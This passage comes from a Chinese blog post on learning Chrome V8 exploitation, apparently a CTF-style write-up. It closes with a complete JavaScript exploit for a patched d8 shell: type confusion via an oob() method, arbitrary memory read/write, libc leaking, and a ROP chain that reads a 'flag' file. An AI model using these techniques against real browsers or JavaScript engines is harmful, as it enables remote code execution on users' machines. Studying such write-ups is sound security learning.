+<p>下面的操作就简单了，劫持控制流一把梭。在2.31及以下版本可以通过修改<code>__free_hook</code>为<code>system</code>函数，然后在函数中创建局部变量即可。因为JS执行过程中对于生命周期结束的变量，会定期进行清除，因此创建地址在堆的局部变量，并写入字符串<code>/bin/sh</code>，即可完成利用。不过对于高版本来说，在没有<code>__free_hook</code>的情况下，可以尝试直接修改栈的返回地址。在gdb调试时通过<code>bt</code>命令可以查看堆栈情况，可以查询到的最初调用的函数是<code>Builtins_JSEntry</code>，通过修改这里为一个无效值然后继续执行的方法进行验证可知，当JS代码执行结束后，将会返回到这个函数。因此我们可以通过调试直接获取到返回地址所在的位置，结合在libc中能够找到的栈地址<code>environ</code>，可以计算出一个偏移量，然后直接写ROP链即可。</p>
+<p>下面的利用代码在<code>GNU C Library (Debian GLIBC 2.38-13) stable release version 2.38</code>版本下测试通过：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> open_addr = libc_base + <span class="number">0xfe0d0n</span>;</span><br><span class="line"><span class="keyword">var</span> read_addr = libc_base + <span class="number">0xfea10n</span>;</span><br><span class="line"><span class="keyword">var</span> puts_addr = libc_base + <span class="number">0x77640n</span>;</span><br><span class="line"><span class="keyword">var</span> environ = libc_base + <span class="number">0x3532b0n</span>;</span><br><span class="line"><span class="keyword">var</span> stack_addr = <span class="title function_">read_at</span>(environ);</span><br><span class="line"><span class="keyword">var</span> rop_start = stack_addr - <span class="number">0xbd0n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ROP chain starts at: 0x&quot;</span> + rop_start.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> poprdi_ret = libc_base + <span class="number">0x28215n</span>;</span><br><span class="line"><span class="keyword">var</span> poprsi_ret = libc_base + <span class="number">0x29b29n</span>;</span><br><span class="line"><span class="keyword">var</span> poprdx_ret = libc_base + <span class="number">0x1085adn</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write_at</span>(stack_addr, <span class="number">0x67616c66n</span>);       <span class="comment">// flag\x00</span></span><br><span class="line"><span class="title function_">write_at</span>(rop_start, poprdi_ret);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">8n</span>, stack_addr);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x10n</span>, poprsi_ret);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x18n</span>, <span class="number">0n</span>);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x20n</span>, open_addr);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x28n</span>, poprdi_ret);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x30n</span>, <span class="number">3n</span>);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x38n</span>, poprsi_ret);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x40n</span>, stack_addr);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x48n</span>, poprdx_ret);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x50n</span>, <span class="number">0x40n</span>);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x58n</span>, read_addr);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x60n</span>, poprdi_ret);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x68n</span>, stack_addr);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x70n</span>, puts_addr);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script is about to end&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>经过调试发现，<code>console.log</code>最终会调用<code>write</code>函数输出，且加或不加<code>--allow-natives-syntax</code>选项会对栈地址偏移产生影响，因此为了方便在不添加该选项时也能进行调试，可以在最后加上一条<code>console.log</code>，然后将断点下在<code>write</code>，即可获取脚本执行结束前一刻的程序状态，以验证自己获取到的偏移量是否正确。</p>
+<h2 id="c6-final-exp"><a class="markdownIt-Anchor" href="#c6-final-exp"></a> C.6 Final EXP</h2>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- int64 &lt;-&gt; double</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> overlapping_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">var</span> for_double_value = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(overlapping_buf);</span><br><span class="line"><span class="keyword">var</span> for_bigint_value = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(overlapping_buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">double_to_int64</span>(<span class="params">double_value</span>) &#123;</span><br><span class="line">    for_double_value[<span class="number">0</span>] = double_value;</span><br><span class="line">    <span class="keyword">return</span> for_bigint_value[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">int64_to_double</span>(<span class="params">int64_value</span>) &#123;</span><br><span class="line">    for_bigint_value[<span class="number">0</span>] = int64_value;</span><br><span class="line">    <span class="keyword">return</span> for_double_value[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- type confusion &amp;&amp; get object address &amp;&amp; treat address as object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> first_object = &#123;<span class="string">&quot;1&quot;</span>: <span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> second_object = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_arr = [first_object, second_object];</span><br><span class="line"><span class="keyword">var</span> float_arr = [<span class="number">0.1</span>, <span class="number">0.2</span>, <span class="number">0.3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_typemap = float_arr.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> obj_typemap = obj_arr.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_object_address</span>(<span class="params">object</span>) &#123;           <span class="comment">// return BigInt</span></span><br><span class="line">    obj_arr[<span class="number">0</span>] = object;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(float_typemap);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = <span class="title function_">double_to_int64</span>(obj_arr[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(obj_typemap);</span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">treat_address_as_object</span>(<span class="params">addr</span>) &#123;        <span class="comment">// receive BigInt</span></span><br><span class="line">    float_arr[<span class="number">0</span>] = <span class="title function_">int64_to_double</span>(addr + <span class="number">1n</span>);</span><br><span class="line">    float_arr.<span class="title function_">oob</span>(obj_typemap);</span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_arr[<span class="number">0</span>];</span><br><span class="line">    float_arr.<span class="title function_">oob</span>(float_typemap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> first_object_addr = <span class="title function_">get_object_address</span>(first_object);</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- R/W anywhere (fake, implemented by float array)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_object_container = [float_typemap, <span class="number">0</span>, <span class="number">0</span>, <span class="title function_">int64_to_double</span>(<span class="number">0x10n</span> * <span class="number">0x100000000n</span>)];</span><br><span class="line"><span class="keyword">var</span> container_addr = <span class="title function_">get_object_address</span>(fake_object_container);</span><br><span class="line"><span class="keyword">var</span> fake_object = <span class="title function_">treat_address_as_object</span>(container_addr + <span class="number">0x30n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_addr_to_rw</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_object_container[<span class="number">2</span>] = <span class="title function_">int64_to_double</span>(addr - <span class="number">0x10n</span> + <span class="number">1n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_rw_addr</span>(<span class="params">idx</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">double_to_int64</span>(fake_object_container[<span class="number">2</span>]) - <span class="number">1n</span> + <span class="number">0x10n</span> + <span class="title class_">BigInt</span>(idx) * <span class="number">8n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read_addr</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="title function_">set_addr_to_rw</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">double_to_int64</span>(fake_object[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write_addr</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    <span class="title function_">set_addr_to_rw</span>(addr);</span><br><span class="line">    fake_object[<span class="number">0</span>] = <span class="title function_">int64_to_double</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- R/W anywhere (real, implemented by BigUint64Array)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_bigint64arr_container = [<span class="number">0.1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> off = <span class="number">0</span>; off &lt; <span class="number">13</span>; off++) &#123;</span><br><span class="line">    <span class="keyword">let</span> v = <span class="title function_">read_addr</span>(<span class="title function_">get_object_address</span>(for_bigint_value) + <span class="title class_">BigInt</span>(off) * <span class="number">8n</span>);</span><br><span class="line">    fake_bigint64arr_container[off] = <span class="title function_">int64_to_double</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// change the elements pointer</span></span><br><span class="line">fake_bigint64arr_container[<span class="number">2</span>] = <span class="title function_">int64_to_double</span>(<span class="title function_">get_object_address</span>(fake_bigint64arr_container) - <span class="number">0x20n</span> + <span class="number">1n</span>);</span><br><span class="line"><span class="comment">// get the heap pointer</span></span><br><span class="line">heap_addr = <span class="title function_">double_to_int64</span>(fake_bigint64arr_container[<span class="number">12</span>]);</span><br><span class="line">fake_bigintarr = <span class="title function_">treat_address_as_object</span>(<span class="title function_">get_object_address</span>(fake_bigint64arr_container) - <span class="number">0x68n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read_at</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_bigint64arr_container[<span class="number">12</span>] = <span class="title function_">int64_to_double</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> fake_bigintarr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write_at</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    fake_bigint64arr_container[<span class="number">12</span>] = <span class="title function_">int64_to_double</span>(addr);</span><br><span class="line">    fake_bigintarr[<span class="number">0</span>] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- Leaking ELF addr</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> typemap = <span class="title function_">double_to_int64</span>(fake_bigint64arr_container[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line"><span class="keyword">var</span> constructor = <span class="title function_">read_at</span>(typemap + <span class="number">0x20n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="keyword">var</span> code = <span class="title function_">read_at</span>(constructor + <span class="number">0x30n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="keyword">var</span> elf_code_addr = <span class="title function_">read_at</span>(code + <span class="number">0x42n</span>);</span><br><span class="line"><span class="keyword">var</span> elf_base = elf_code_addr - <span class="number">0x10274E0n</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- Leaking Libc addr</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> abort_addr = <span class="title function_">read_at</span>(elf_base + <span class="number">0x12B4518n</span>);</span><br><span class="line"><span class="keyword">var</span> libc_base = abort_addr - <span class="number">0x2641an</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libc base: 0x&quot;</span> + libc_base.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> system_addr = libc_base + <span class="number">0x4dab0n</span>;</span><br><span class="line"><span class="keyword">var</span> open_addr = libc_base + <span class="number">0xfe0d0n</span>;</span><br><span class="line"><span class="keyword">var</span> read_addr = libc_base + <span class="number">0xfea10n</span>;</span><br><span class="line"><span class="keyword">var</span> puts_addr = libc_base + <span class="number">0x77640n</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- ROP</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> environ = libc_base + <span class="number">0x3532b0n</span>;</span><br><span class="line"><span class="keyword">var</span> stack_addr = <span class="title function_">read_at</span>(environ);</span><br><span class="line"><span class="keyword">var</span> rop_start = stack_addr - <span class="number">0xbd0n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ROP chain starts at: 0x&quot;</span> + rop_start.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> poprdi_ret = libc_base + <span class="number">0x28215n</span>;</span><br><span class="line"><span class="keyword">var</span> poprsi_ret = libc_base + <span class="number">0x29b29n</span>;</span><br><span class="line"><span class="keyword">var</span> poprdx_ret = libc_base + <span class="number">0x1085adn</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write_at</span>(stack_addr, <span class="number">0x67616c66n</span>);       <span class="comment">// flag\x00</span></span><br><span class="line"><span class="title function_">write_at</span>(rop_start, poprdi_ret);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">8n</span>, stack_addr);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x10n</span>, poprsi_ret);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x18n</span>, <span class="number">0n</span>);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x20n</span>, open_addr);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x28n</span>, poprdi_ret);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x30n</span>, <span class="number">3n</span>);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x38n</span>, poprsi_ret);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x40n</span>, stack_addr);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x48n</span>, poprdx_ret);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x50n</span>, <span class="number">0x40n</span>);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x58n</span>, read_addr);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x60n</span>, poprdi_ret);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x68n</span>, stack_addr);</span><br><span class="line"><span class="title function_">write_at</span>(rop_start + <span class="number">0x70n</span>, puts_addr);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script is about to end&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>效果：</p>
+<p><img src="14.png" alt="" /></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/12/01/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-1/" rel="prev" title="chrome v8 pwn 学习 (1)">
+      <i class="fa fa-chevron-left"></i> chrome v8 pwn 学习 (1)
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#b-jsobject"><span class="nav-number">1.</span> <span class="nav-text"> B. JSObject</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#b1-jsreceiver"><span class="nav-number">1.1.</span> <span class="nav-text"> B.1 JSReceiver</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#b2-how-to-debug-d8"><span class="nav-number">1.2.</span> <span class="nav-text"> B.2 How to DEBUG d8</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#c-chrome-v8-first-blood"><span class="nav-number">2.</span> <span class="nav-text"> C. Chrome V8 First Blood</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#c1-type-confusion"><span class="nav-number">2.1.</span> <span class="nav-text"> C.1 Type Confusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c2-object-address"><span class="nav-number">2.2.</span> <span class="nav-text"> C.2 Object &amp;&amp; Address</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c3-rw-anywhere"><span class="nav-number">2.3.</span> <span class="nav-text"> C.3 R&#x2F;W Anywhere</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c4-getting-memory-maps"><span class="nav-number">2.4.</span> <span class="nav-text"> C.4 Getting Memory Maps</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c5-rop-orw"><span class="nav-number">2.5.</span> <span class="nav-text"> C.5 ROP &amp;&amp; ORW</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c6-final-exp"><span class="nav-number">2.6.</span> <span class="nav-text"> C.6 Final EXP</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CoLin</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">162</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CoLin</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">22:54</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
